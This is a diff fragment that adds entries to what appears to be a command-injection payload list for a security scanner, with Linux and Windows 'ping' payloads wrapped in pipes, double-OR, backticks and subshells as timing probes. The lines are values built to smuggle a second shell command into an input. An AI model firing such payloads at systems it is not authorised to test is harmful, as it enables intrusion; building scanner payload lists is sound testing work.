@@ -49,6 +49,8 @@
         {"payload": "|| ping -c 10 127.0.0.1 ||", "type": "Linux ping 10s double-OR wrapped"},
         {"payload": "`ping -c 5 127.0.0.1`", "type": "Linux ping backtick"},
         {"payload": "$(ping -c 5 127.0.0.1)", "type": "Linux ping subshell"},
+        {"payload": "x||ping -c 10 127.0.0.1||", "type": "Linux ping 10s double-OR wrapped"},
+        {"payload": "x||ping+-c+10+127.0.0.1||", "type": "Linux plus-encoded ping 10s double-OR"},
 
         {"payload": "| ping -n 5 127.0.0.1", "type": "Windows ping pipe"},
         {"payload": "|| ping -n 5 127.0.0.1 ||", "type": "Windows ping double-OR wrapped"},
